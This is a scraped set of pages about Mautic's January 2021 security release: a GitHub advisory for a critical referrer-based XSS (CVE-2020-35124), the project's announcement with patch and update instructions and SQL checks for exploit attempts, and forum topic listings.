  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmautic%2Fmautic%2Fsecurity%2Fadvisories%2FGHSA-39wj-j3jc-858m)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=mautic%2Fmautic)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mautic](/mautic)
/
**[mautic](/mautic/mautic)**
Public

* [Notifications](/login?return_to=%2Fmautic%2Fmautic) You must be signed in to change notification settings
* [Fork
  2.7k](/login?return_to=%2Fmautic%2Fmautic)
* [Star
   7.6k](/login?return_to=%2Fmautic%2Fmautic)

* [Code](/mautic/mautic)
* [Issues
  204](/mautic/mautic/issues)
* [Pull requests
  202](/mautic/mautic/pulls)
* [Discussions](/mautic/mautic/discussions)
* [Actions](/mautic/mautic/actions)
* [Projects
  1](/mautic/mautic/projects)
* [Security](/mautic/mautic/security)
* [Insights](/mautic/mautic/pulse)

Additional navigation options

* [Code](/mautic/mautic)
* [Issues](/mautic/mautic/issues)
* [Pull requests](/mautic/mautic/pulls)
* [Discussions](/mautic/mautic/discussions)
* [Actions](/mautic/mautic/actions)
* [Projects](/mautic/mautic/projects)
* [Security](/mautic/mautic/security)
* [Insights](/mautic/mautic/pulse)

# XSS vulnerability leveraged through referrers could allow un-authorized admin access

Critical

[RCheesley](/RCheesley)
published
GHSA-39wj-j3jc-858m
Jan 14, 2021

## Package

composer

mautic/core
([Composer](/advisories?query=ecosystem%3Acomposer))

## Affected versions

<2.16.5 and <3.2.3

## Patched versions

2.16.5, 3.2.4

## Description

### Impact

This is a cross-site scripting vulnerability which affects every version of Mautic and could allow an attacker unauthorised administrator level access to Mautic.

This vulnerability was reported by Naveen Sunkavally at Horizon3.ai.

### Patches

Upgrade to 3.2.4 or 2.16.5.

Link to patch for 2.x versions: <https://github.com/mautic/mautic/compare/2.16.4...2.16.5.diff>

Link to patch for 3.x versions: <https://github.com/mautic/mautic/compare/3.2.2...3.2.4.diff>

### Workarounds

None

### References

<https://www.mautic.org/blog/community/security-release-all-versions-mautic-prior-2-16-5-and-3-2-4>

### For more information

If you have any questions or comments about this advisory:

* Post in <https://forum.mautic.org/c/support>
* Email us at security@mautic.org

### Severity

Critical

### CVE ID

CVE-2020-35124

### Weaknesses

No CWEs

### Credits

* [![@nvn1729](https://avatars.githubusercontent.com/u/348774?s=40&v=4)](/nvn1729)
  [nvn1729](/nvn1729)
  Analyst

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from forum.mautic.org_e8f793d0_20250119_131223.html ===


[Mautic Forums](/)

# [Product Support](/c/support/8)

| Topic |  | Replies | Views | Activity |
| --- | --- | --- | --- | --- |
| [About the Support forum](https://forum.mautic.org/t/about-the-support-forum/1368)  [Product Support](/c/support/8) |  | 1 | 3371 | January 25, 2021 |
| ["Not Found Error" after admin user creation: AAAARGH Why can't I install this thing?](https://forum.mautic.org/t/not-found-error-after-admin-user-creation-aaaargh-why-cant-i-install-this-thing/34785)  [Product Support](/c/support/8) |  | 1 | 3 | January 19, 2025 |
| [DOCKER INSTALLATION: Can't Connect to MYSQL Server](https://forum.mautic.org/t/docker-installation-cant-connect-to-mysql-server/34710)  [Mautic 5 Install/Upgrade Support](/c/support/mautic-5-install-upgrade-support/108) |  | 10 | 34 | January 19, 2025 |
| [Processing Email Queue Causes Campaign to be Unpublished](https://forum.mautic.org/t/processing-email-queue-causes-campaign-to-be-unpublished/34786)  [Product Support](/c/support/8) |  | 0 | 2 | January 18, 2025 |
| [Upgrading from 5.0.4 to 5.2.0 on Docker](https://forum.mautic.org/t/upgrading-from-5-0-4-to-5-2-0-on-docker/34291)  [Product Support](/c/support/8) |  | 12 | 81 | January 18, 2025 |
| [CRITICAL: Uncaught PHP Exception Twig error](https://forum.mautic.org/t/critical-uncaught-php-exception-twig-error/31562)  [Mautic 5 Install/Upgrade Support](/c/support/mautic-5-install-upgrade-support/108) |  | 9 | 636 | January 18, 2025 |
| [Integrity constraint violation: 1452 Cannot add or update a child row](https://forum.mautic.org/t/integrity-constraint-violation-1452-cannot-add-or-update-a-child-row/34784)  [Product Support](/c/support/8) |  | 0 | 3 | January 18, 2025 |
| [Migrate segments and contacts from M4 to M5, clean installation](https://forum.mautic.org/t/migrate-segments-and-contacts-from-m4-to-m5-clean-installation/34554)  [Mautic 5 Install/Upgrade Support](/c/support/mautic-5-install-upgrade-support/108) |  | 9 | 42 | January 17, 2025 |
| [Plugin Installation error through marketplace](https://forum.mautic.org/t/plugin-installation-error-through-marketplace/28459)  [Product Support](/c/support/8) [mautic-4](https://forum.mautic.org/tag/mautic-4) |  | 13 | 608 | January 17, 2025 |
| [Which composer.json to use for production?](https://forum.mautic.org/t/which-composer-json-to-use-for-production/34752)  [Mautic 5 Install/Upgrade Support](/c/support/mautic-5-install-upgrade-support/108) |  | 2 | 15 | January 17, 2025 |
| [<mj-include /> not working in a MJML template in Mautic v5](https://forum.mautic.org/t/mj-include-not-working-in-a-mjml-template-in-mautic-v5/34775)  [Product Support](/c/support/8) |  | 0 | 6 | January 17, 2025 |
| [CKEditor change config in Mautic 5 to allow all html](https://forum.mautic.org/t/ckeditor-change-config-in-mautic-5-to-allow-all-html/34756)  [Product Support](/c/support/8) |  | 2 | 12 | January 17, 2025 |
| [Feedback on the Mautic 5 docker image experience](https://forum.mautic.org/t/feedback-on-the-mautic-5-docker-image-experience/34591)  [Mautic 5 Install/Upgrade Support](/c/support/mautic-5-install-upgrade-support/108) [community](https://forum.mautic.org/tag/community) ,  [mautic-5](https://forum.mautic.org/tag/mautic-5) |  | 14 | 92 | January 16, 2025 |
| [I need help in updating to 5.2.1](https://forum.mautic.org/t/i-need-help-in-updating-to-5-2-1/34723)  [Mautic 5 Install/Upgrade Support](/c/support/mautic-5-install-upgrade-support/108) |  | 1 | 41 | January 16, 2025 |
| [Really slow Triggering of Scheduled Events](https://forum.mautic.org/t/really-slow-triggering-of-scheduled-events/34763)  [Mautic 5 Install/Upgrade Support](/c/support/mautic-5-install-upgrade-support/108) |  | 3 | 10 | January 16, 2025 |
| [Cronjob notice in Mautic log](https://forum.mautic.org/t/cronjob-notice-in-mautic-log/34762)  [Product Support](/c/support/8) [mautic-4](https://forum.mautic.org/tag/mautic-4) |  | 5 | 14 | January 16, 2025 |
| [Perefence Center Pages](https://forum.mautic.org/t/perefence-center-pages/34325)  [Product Support](/c/support/8) |  | 1 | 17 | January 15, 2025 |
| [Mautic 5 install through docker](https://forum.mautic.org/t/mautic-5-install-through-docker/34320)  [Mautic 5 Install/Upgrade Support](/c/support/mautic-5-install-upgrade-support/108) |  | 2 | 111 | January 15, 2025 |
| [Image upload problem in template](https://forum.mautic.org/t/image-upload-problem-in-template/34606)  [Product Support](/c/support/8) |  | 7 | 26 | January 15, 2025 |
| [Mautic 5 Emails not sending](https://forum.mautic.org/t/mautic-5-emails-not-sending/34742)  [Product Support](/c/support/8) |  | 5 | 26 | January 14, 2025 |
| [Can i relate a "focus" item with an contact?](https://forum.mautic.org/t/can-i-relate-a-focus-item-with-an-contact/34732)  [Product Support](/c/support/8) |  | 2 | 12 | January 13, 2025 |
| [Anyone manage to install mautic-bitly-bundle?](https://forum.mautic.org/t/anyone-manage-to-install-mautic-bitly-bundle/32331)  [Mautic 5 Install/Upgrade Support](/c/support/mautic-5-install-upgrade-support/108) |  | 2 | 96 | January 13, 2025 |
| [Running doctrine:migration:migrate does not apply all upgrades](https://forum.mautic.org/t/running-doctrinemigrate-does-not-apply-all-upgrades/34724)  [Mautic 5 Install/Upgrade Support](/c/support/mautic-5-install-upgrade-support/108) |  | 5 | 19 | January 14, 2025 |
| [Can't send email with Mautic 5.1.1](https://forum.mautic.org/t/cant-send-email-with-mautic-5-1-1/33920)  [Product Support](/c/support/8) |  | 18 | 227 | January 12, 2025 |
| [API: Search by email using "List Contacts"?](https://forum.mautic.org/t/api-search-by-email-using-list-contacts/6776)  [Product Support](/c/support/8) |  | 5 | 3161 | January 12, 2025 |
| [Focus item does not show up, once the user clicks the "X" (dismiss)](https://forum.mautic.org/t/focus-item-does-not-show-up-once-the-user-clicks-the-x-dismiss/34733)  [Product Support](/c/support/8) |  | 0 | 5 | January 12, 2025 |
| [Problem "No transport supports the given Messenger DSN" after update to Mautic 5.2.1](https://forum.mautic.org/t/problem-no-transport-supports-the-given-messenger-dsn-after-update-to-mautic-5-2-1/34698)  [Mautic 5 Install/Upgrade Support](/c/support/mautic-5-install-upgrade-support/108) |  | 3 | 21 | January 11, 2025 |
| [500 error when open a contact having a bounce-flag](https://forum.mautic.org/t/500-error-when-open-a-contact-having-a-bounce-flag/34661)  [Product Support](/c/support/8) |  | 2 | 14 | January 11, 2025 |
| [Creation of dynamic property Mautic\Middleware\MiddlewareBuilder::$spec](https://forum.mautic.org/t/creation-of-dynamic-property-mautic-middleware-middlewarebuilder-spec/34720)  [Mautic 5 Install/Upgrade Support](/c/support/mautic-5-install-upgrade-support/108) |  | 0 | 5 | January 11, 2025 |
| [N8n and Mautic 5 API nor OAuth 2 working](https://forum.mautic.org/t/n8n-and-mautic-5-api-nor-oauth-2-working/34619)  [Mautic 5 Install/Upgrade Support](/c/support/mautic-5-install-upgrade-support/108) |  | 3 | 42 | January 10, 2025 |

**[next page →](/c/support/8?page=1)**

* [Home](/)
* [Categories](/categories)
* [Guidelines](/guidelines)
* [Terms of Service](https://www.mautic.org/code-of-conduct/)
* [Privacy Policy](https://www.mautic.org/privacy-policy/)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



=== Content from www.mautic.org_5fe46b86_20250119_131221.html ===

[Skip to main content](#main-content)

# [Home](/)

## User account menu

* [Register/Log In](/user/login)

## Main navigation

* About Mautic
  + [What is Mautic?](/what-is-mautic)
  + [Newsletter](/community/get-involved/mailing-lists)
  + [Take a tour](/tour)
  + [Marketing Automation](/marketing-automation-software)
  + [Mautic Case Studies](/case-studies)
  + Governance
    - [Mautic Trademark](/about/trademark)
    - [Governance history](/about/governance)
    - [Mautic Leadership Team](/mautic-leadership-team)
    - [Mautic Council](/mautic-council)
    - [The future of Mautic](/future-of-mautic)
    - [💰 Open Collective](https://opencollective.com/mautic "Check Mautic's financial activity")
  + Current Initiatives
    - [Strategic Initiatives](/strategic-initiatives)
    - [Community Initiatives](/community-initiatives)
    - [Next Generation](/next-generation)
    - [Tiger Teams](/tiger-teams)
    - [Working Groups](/working-groups)
* [Blog](/blog "Mautic Community Blog")
* Download
  + [Download Mautic](/download "Download Mautic")
  + [Requirements](/download/requirements)
  + Releases
    - [Mautic Releases](/mautic-releases)
    - [Source Code](/download/source-code)
    - [Demo](/demo)
  + Security
    - [Mautic Security Team](/mautic-security-team)
    - [Mautic Security Advisory Policy](/mautic-security-team/mautic-security-advisory-policy)
    - [How to report a security issue](/mautic-security-team/how-to-report-a-security-issue)
    - [Resolving Security Issues](/mautic-security-team/triaging-and-resolving-security-issues)
    - [How to join the Mautic Security Team](/mautic-security-team/join-the-team)
    - [Meet the Mautic Security Team](/meet-the-mautic-security-team)
* Get Support
  + [Getting Support](/support)
  + [Community Forums](https://forum.mautic.org/)
  + Documentation
    - [User Documentation](https://docs.mautic.org "Mautic end-user documentation")
    - [Developer Documentation](https://devdocs.mautic.org "Mautic Developer Documentation")
    - [Knowledgebase](https://kb.mautic.org)
  + [Basic setup guide](https://docs.mautic.org/en/5.x/getting_started/how_to_install_mautic.html)
  + [Building a theme](https://devdocs.mautic.org/en/5.x/themes/getting_started.html)
  + [Contact Information](/about/contact-information)
* Support Mautic
  + Financial support
    - [Become a member](/become-a-member-of-mautic)
    - [Members](/mautic-members)
    - [Partners](/mautic-partners)
    - [Sponsors](/sponsors)
  + Contribute
    - [Code of conduct](/code-of-conduct)
    - [Community Handbook](https://contribute.mautic.org "Handbook for the Mautic Community")
    - [Join the community](/community)
    - [Ways to contribute](https://mau.tc/contribute)
    - [Get started](/community/get-involved)
    - [Translation Guidance](/translation-guidance)
    - [Community Events](https://community.mautic.org/meetings/)
  + [Community Portal](https://community.mautic.org)
  + [👕 Swag shop](https://mautic-community-swag-shop.myspreadshop.com/)
* Try Mautic
  + [Request a trial](https://m.mautic.org/mautic-start-your-trial)

## User account menu

* [Register/Log In](/user/login)

## Search

Search

[Community Marketing Blog](/category/blog/community)  [0](#node-blog-comment--2)

# Security release for all versions of Mautic prior to 2.16.5 and 3.2.4

By [Ruth Cheesley](/author/ruth-cheesley "View user profile.")
· PUBLISHED January 14, 2021 · UPDATED January 28, 2021

Image
 ![Security Release](/sites/default/files/styles/blog_detail_featured_image_720x330/public/2021-01/mautic-blog-image-security-release.png?itok=uc224A1m)

We have made available for immediate download an out-of-sequence release for both Mautic 2.x and 3.x.

We have also published some resources on the website:

* [Landing page for the security team](https://www.mautic.org/mautic-security-team)
* [Security Advisory Policy](https://www.mautic.org/mautic-security-team/mautic-security-advisory-policy)
* [How to report a security issue](https://www.mautic.org/mautic-security-team/how-to-report-a-security-issue)
* [How we triage, resolve and release fixes for security issues](https://www.mautic.org/mautic-security-team/triaging-and-resolving-security-issues)
* [How to join the Mautic Security Team](https://www.mautic.org/mautic-security-team/join-the-team)
* [Meet the Mautic Security Team](https://www.mautic.org/meet-the-mautic-security-team)

This release addresses:

1. A **Moderately Critical** Vulnerability (Vulnerability 1) reported by Dardan Prebreza at Bishop Fox, and
2. A **Highly Critical** Vulnerability (Vulnerability 2) reported by Naveen Sunkavally at Horizon3.ai.

### Risk Ratings

These are based on the information in the ‘[how we triage, resolve and release fixes for security issues](https://www.mautic.org/mautic-security-team/triaging-and-resolving-security-issues)’ page above.

#### Vulnerability 1

12/25 (**Moderately Critical**) AC:Complex/A:Admin/CI:Some/II:Some/E:Theoretical/TD:All

#### Vulnerability 2

22/25 (**Highly Critical**) AC:None/A:None/CI:All/II:All/E:Theoretical/TD:All

As Vulnerability 2 affects **every released version** of Mautic and allows an attacker to create a user in Mautic with elevated privileges, all users are **strongly urged** to update immediately.

More information can be found in the CVE reports here - details will be added following the release:

### Vulnerability 1

[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35128](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3142)

### Vulnerability 2

<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35124>

<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35125>

### Patches

The easiest way to protect your Mautic instances is to simply update to 2.16.5 or 3.2.4 in the usual way. If you are unable to do this for any reason, the patch files are provided below.
#### Fix for both vulnerabilities

Link to patch for 2.x versions: <https://github.com/mautic/mautic/compare/2.16.4...2.16.5.diff>

Link to patch for 3.x versions: <https://github.com/mautic/mautic/compare/3.2.2...3.2.4.diff>

## ⚠️ Important note for users who are currently running 3.2.0 or later

Are you currently using Mautic 3.2.0 or later **and do you update through the CLI (Command Line Interface)**? Then the message below applies to you! This **does not apply** if you're updating through the UI (graphical interface).

When you're trying to update through the CLI, you might run into the following error:

```

Notice: Undefined index: message in /var/www/html/app/bundles/CoreBundle/Update/Step/InstallNewFilesStep.php on line 131

Failed to execute command php bin/console mautic:update:apply: exit status 1
```

This bug was introduced in Mautic 3.2.0 and fixed in 3.2.4. Please use the following workaround:

```

wget https://github.com/mautic/mautic/releases/download/3.2.4/3.2.4-update.zip
php bin/console mautic:update:apply --update-package=3.2.4-update.zip
php bin/console mautic:update:apply --finish
```
## How to scan for attempts to exploit the vulnerability

We have also provided some searches that you can do to see if there have been attempts to exploit the highly critical vulnerability.

### Check for exploit attempts - Vulnerability 1

To see if there was an attempt at this vulnerability, run the following queries replacing PREFIX\_ with your own if configured:

* >select \* from PREFIX\_companies where companyname like '%<%' or companyname like '%onerror%';

### Check for exploit attempts - Vulnerability 2

The first and absolutely necessary step is to check if there are any unrecognized users listed in Mautic’s User manager. Delete or unpublish any not recognized immediately.

To see if there was an attempt at this vulnerability, run the following queries replacing PREFIX\_ with your own if configured:

* >select \* from PREFIX\_form\_submissions where referer like '%<%' or referer like '%onerror%';
* >select \* from PREFIX\_asset\_downloads where referer like '%<%' or referer like '%onerror%';
* >select \* from PREFIX\_companies where companyname like '%<%' or companyname like '%onerror%';

If there are any results returned, review them to look for HTML tags. If it looks like HTML is embedded, delete the entry from the database.

## Credits

Thanks to Dardan Prebreza at Bishop Fox and Naveen Sunkavally at Horizon3.ai for responsibly reporting these vulnerabilities.

Thanks to Alan Hartless at Acquia and Dennis Ameling for fixing these vulnerabilities.

**Addendum**

After the release was made, a bug was identified which affects command-line updates in Mautic 3.2.0 and later. This bug was introduced back in Mautic 3.2.0 but was causing problems for people updating at the command line.  As a result, we issued 3.2.4 to address this issue.

Tags
[security-announcement](/tag/security-announcement)
[release](/tag/release)
[new release](/tag/new-release)

## You May Also Like...

 [![a black background with a sparkler painting the numbers 2024 in the sky](/sites/default/files/styles/small_highlight_239_x_113_/public/2025-01/happy-new-year-2024-sparkling-burning-text-happy-new-year-2024-isolated-black-background.jpg?itok=trNoF_gU)](/blog/community/2024-year-review)
[0](/blog/community/2024-year-review#node-blog-comment--2)[2024: year in review](/blog/community/2024-year-review)January 17, 2025
 [![Photo of a mug containing hot chocolate with marshmallows, and some of the marshmallows have been made into the shape of a snowman with a face drawn on and hands and ears added. There are oranges and cinnamon on the table beside and behind is a blurred image of festive lights.](/sites/default/files/styles/small_highlight_239_x_113_/public/2025-01/26163.jpg?itok=1N7_H-p4)](/blog/community/open-startup-report-22-december-2024)
[0](/blog/community/open-startup-report-22-december-2024#node-blog-comment--2)[Open Startup Report #22 - December 2024](/blog/community/open-startup-report-22-december-2024)January 16, 2025
 [![A photo of a brown tree which is growing sideways, with a wooden post carved to look like a hand which is supporting one of the large boughs.](/sites/default/files/styles/small_highlight_239_x_113_/public/2024-08/neil-thomas-SIU1Glk6v5k-unsplash.jpg?itok=NpTaR14C)](/blog/community/announcing-launch-mautics-extended-long-term-support-elts-program)
[0](/blog/community/announcing-launch-mautics-extended-long-term-support-elts-program#node-blog-comment--2)[Announcing the launch of Mautic's Extended Long Term Support (ELTS) program](/blog/community/announcing-launch-mautics-extended-long-term-support-elts-program)December 19, 2024

### COMMENT ON THIS ARTICLE BY CLICKING HERE: [FORUM.MAUTIC.ORG](https://forum.mautic.org/t/security-release-for-all-versions-of-mautic-prior-to-2-16-5-and-3-2-3/17786)

## Follow

* [Facebook](http://facebook.com/MauticCommunity "Facebook")
* [Linkedin](https://linkedin.com/company/mautic-community "Linkedin")
* [Twitter](https://twitter.com/MauticCommunity "Twitter")
* [Youtube](https://www.youtube.com/channel/UCcc9_x7_gNICPkrbG2NU9Xw "Youtube")

* Previous Story[Mautic Conference 2020: What a Great Event!](/blog/community/mautic-conference-2020-what-great-event)
* Next Story[Q4 2020 Mautic Community Roundup](/blog/community/q4-2020-mautic-community-roundup)

* [Recent Blog](/quicktabs/nojs/blog_right_sidebar/0)
* [Recent Comment](/quicktabs/nojs/blog_right_sidebar/1)
* [Tag Cloud](/quicktabs/nojs/blog_right_sidebar/2)

 [![a black background with a sparkler painting the numbers 2024 in the sky](/sites/default/files/styles/recent_blog_sidebar_80x80/public/2025-01/happy-new-year-2024-sparkling-burning-text-happy-new-year-2024-isolated-black-background.jpg?itok=rOEyCsAw)](/blog/community/2024-year-review)
[Community Marketing Blog](/category/blog/community)
[2024: year in review](/blog/community/2024-year-review)
17 Jan, 2025
 [![Photo of a mug containing hot chocolate with marshmallows, and some of the marshmallows have been made into the shape of a snowman with a face drawn on and hands and ears added. There are oranges and cinnamon on the table beside and behind is a blurred image of festive lights.](/sites/default/files/styles/recent_blog_sidebar_80x80/public/2025-01/26163.jpg?itok=3HgQQmbx)](/blog/community/open-startup-report-22-december-2024)
[Community Marketing Blog](/category/blog/community)
[Open Startup Report #22 - December 2024](/blog/community/open-startup-report-22-december-2024)
16 Jan, 2025
 [![A photo of a brown tree which is growing sideways, with a wooden post carved to look like a hand which is supporting one of the large boughs.](/sites/default/files/styles/recent_blog_sidebar_80x80/public/2024-08/neil-thomas-SIU1Glk6v5k-unsplash.jpg?itok=MKrUx9S0)](/blog/community/announcing-launch-mautics-extended-long-term-support-elts-program)
[Community Marketing Blog](/category/blog/community)
[Announcing the launch of Mautic's Extended Long Term Support (ELTS) program](/blog/community/announcing-launch-mautics-extended-long-term-support-elts-program)
19 Dec, 2024
 [![Title Image for RFP: mautic-certification-provider](/sites/default/files/styles/recent_blog_sidebar_80x80/public/2024-12/rfp-mautic-certification-provider_2.png?itok=VJgPhDv7)](/blog/rfp-certification-provider)
[Community Marketing Blog](/category/blog/community)
[Request for Proposals (RFP) for Official Mautic Certification Provider](/blog/rfp-certification-provider)
19 Dec, 2024
 [![Dark blue gradient background with the Mautic logo and text in white saying 'Call for council nominations' with illustrations of lots of different hands being held up with different gestures wearing different coloured clothes.](/sites/default/files/styles/recent_blog_sidebar_80x80/public/2023-11/Call%20for%20council%20nominations%20%28Blog%20Banner%29%20720x330.png?itok=ijbKvefV)](/blog/community/last-call-council-nominations)
[Community Marketing Blog](/category/blog/community)
[Last call for Council nominations](/blog/community/last-call-council-nominations)
19 Dec, 2024

[![sadeya12's avatar](https://avatars.discourse-cdn.com/v4/letter/s/ecb155/90.png "sadeya12's avatar")](/blog/community/4-ways-automate-your-mautic-workflows#node-blog-comment--2)

sadeya12 says:

[Its an amazing explanation for me it will be help me a lot…..So I would love to thank you for this…](/blog/community/4-ways-automate-your-mautic-workflows#node-blog-comment--2)

[![rcheesley's avatar](https://forum.mautic.org/user_avatar/forum.mautic.org/rcheesley/90/7424_2.png "rcheesley's avatar")](/blog/press/request-proposal-rfp-official-mautic-trial-provider#node-blog-comment--2)

rcheesley says:

[![pierre_a's avatar](https://forum.mautic.org/user_avatar/forum.mautic.org/pierre_a/90/7031_2.png "pierre_a's avatar")](/blog/community/towards-a-future-of-independence#node-blog-comment--2)

pierre\_a says:

[Thank you all for your investment and the transparency of this communication.
All the best for the…](/blog/community/towards-a-future-of-independence#node-blog-comment--2)

[![escopecz's avatar](https://forum.mautic.org/user_avatar/forum.mautic.org/escopecz/90/370_2.png "escopecz's avatar")](/blog/community/towards-a-future-of-independence#node-blog-comment--2)

escopecz says:

[I don’t like to keep questions hanging without an answer. I can’t find a way how to answer it…](/blog/community/towards-a-future-of-independence#node-blog-comment--2)

[![modifiedcontent's avatar](https://forum.mautic.org/user_avatar/forum.mautic.org/modifiedcontent/90/511_2.png "modifiedcontent's avatar")](/blog/community/towards-a-future-of-independence#node-blog-comment--2)

modifiedcontent says:

[escopecz:
Thats how it would work in a company with paid employees. This is an open source…](/blog/community/towards-a-future-of-independence#node-blog-comment--2)

[automation](/tag/automation)[b2b marketing](/tag/b2b-marketing)[b2c marketing](/tag/b2c-marketing)[community](/tag/community)[content marketing](/tag/content-marketing)[contributing](/tag/contributing)[customer relationship management](/tag/customer-relationship-management)[developer](/tag/developer)[email marketing](/tag/email-marketing)[event](/tag/event)[governance](/tag/governance)[lead nurturing](/tag/lead-nurturing)[marketing](/tag/marketing)[marketing automation](/tag/marketing-automation)[marketing blog](/tag/marketing-blog)[marketing strategy](/tag/marketing-strategy)[mautic](/tag/mautic)[mautic new release](/tag/mautic-new-release)[MautiCon](/tag/mauticon)[new release](/tag/new-release)[open source](/tag/open-source)[open source marketing](/tag/open-source-marketing)[Open Startup](/tag/open-startup)[Quarterly Report](/tag/quarterly-report)[release](/tag/release)[Report](/tag/report)[reporting](/tag/reporting)[Round Up](/tag/round)[sales funnel](/tag/sales-funnel)[tips](/tag/tips)

## BLOG CATEGORIES

* [Marketer Blog](/category/blog/marketer)
* [Developer Blog](/category/blog/developer)
* [Community Blog](/category/blog/community)
* [Integrator Blog](/category/blog/integrator)
* [Press](/category/blog/press)

[![JWT Auth for open source projects](//cdn.auth0.com/oss/badges/a0-badge-light.png)](https://auth0.com/?utm_source=oss&utm_medium=gp&utm_campaign=oss)

## Help

* [Getting Started](/getting-started)
* [About](/what-is-mautic)
* [Support](https://forum.mautic.org/c/support)

## Recent Articles

[2024: year in review](/blog/community/2024-year-review)
[Open Startup Report #22 - December 2024](/blog/community/open-startup-report-22-december-2024)
[Announcing the launch of Mautic's Extended Long Term Support (ELTS) program](/blog/community/announcing-launch-mautics-extended-long-term-support-elts-program)
[Request for Proposals (RFP) for Official Mautic Certification Provider](/blog/rfp-certification-provider)
[Last call for Council nominations](/blog/community/last-call-council-nominations)

## Links

* [DB Hurley, Mautic Founder](http://dbhurley.com/)
* [Get involved](/community/get-involved "Get involved with the Mautic Community")
* [Mautic Community Forums](https://forum.mautic.org "Mautic Community Forums")
* [Official Mautic Newsletter](https://www.mautic.org/community/get-involved/mailing-lists)

[![Creative Commons Licence](https://i.creativecommons.org/l/by-sa/4.0/88x31.png)](http://creativecommons.org/licenses/by-sa/4.0/)This work is licensed under a [Creative Commons Attribution-ShareAlike 4.0 International License](http://creativecommons.org/licenses/by-sa/4.0/).

MAUTIC is a trademark of the Mautic project of the Open Source Collective.

## Follow

* [Facebook](http://facebook.com/MauticCommunity "Facebook")
* [Linkedin](https://linkedin.com/company/mautic-community "Linkedin")
* [Twitter](https://twitter.com/MauticCommunity "Twitter")
* [Youtube](https://www.youtube.com/channel/UCcc9_x7_gNICPkrbG2NU9Xw "Youtube")



=== Content from forum.mautic.org_69ffae2e_20250119_111800.html ===


[Mautic Forums](/)

# [Announcements](/c/announcements/16)

| Topic |  | Replies | Views | Activity |
| --- | --- | --- | --- | --- |
| [Using the Community Forums with Slack](https://forum.mautic.org/t/using-the-community-forums-with-slack/12011)   The Mautic Community uses Discourse as a complementary system to our Slack instance, not as a replacement or alternative. Both systems provide a unique set of features that are useful for building and supporting our com… |  | 2 | 5334 | December 13, 2019 |
| [About the Announcements category](https://forum.mautic.org/t/about-the-announcements-category/1378) |  | 1 | 796 | January 25, 2021 |
| [Announcing the launch of Mautic's Extended Long Term Support (ELTS) program](https://forum.mautic.org/t/announcing-the-launch-of-mautics-extended-long-term-support-elts-program/34499) |  | 0 | 106 | December 20, 2024 |
| [Request for Proposals (RFP) for Official Mautic Certification Provider](https://forum.mautic.org/t/request-for-proposals-rfp-for-official-mautic-certification-provider/34498) |  | 0 | 96 | December 20, 2024 |
| [Last call for Council nominations](https://forum.mautic.org/t/last-call-for-council-nominations/34490) |  | 0 | 40 | December 19, 2024 |
| [Mautic 5.2 'Pleiades': A New Star in Marketing Automation](https://forum.mautic.org/t/mautic-5-2-pleiades-a-new-star-in-marketing-automation/34283) |  | 0 | 319 | December 2, 2024 |
| [Participate in the First Annual Mautic Business Survey!](https://forum.mautic.org/t/participate-in-the-first-annual-mautic-business-survey/33856) |  | 0 | 80 | October 18, 2024 |
| [Announcing the Potential Extended Long Term Support (ELTS) Program for Mautic: We Need Your Feedback!](https://forum.mautic.org/t/announcing-the-potential-extended-long-term-support-elts-program-for-mautic-we-need-your-feedback/33356) |  | 0 | 171 | September 2, 2024 |
| [Announcing the inaugural Mautic Awards - will you be taking center stage?](https://forum.mautic.org/t/announcing-the-inaugural-mautic-awards-will-you-be-taking-center-stage/32733) |  | 0 | 143 | July 11, 2024 |
| [Release Announcement Mautic 5.1: Andromeda Edition](https://forum.mautic.org/t/release-announcement-mautic-5-1-andromeda-edition/32367) |  | 0 | 604 | June 13, 2024 |
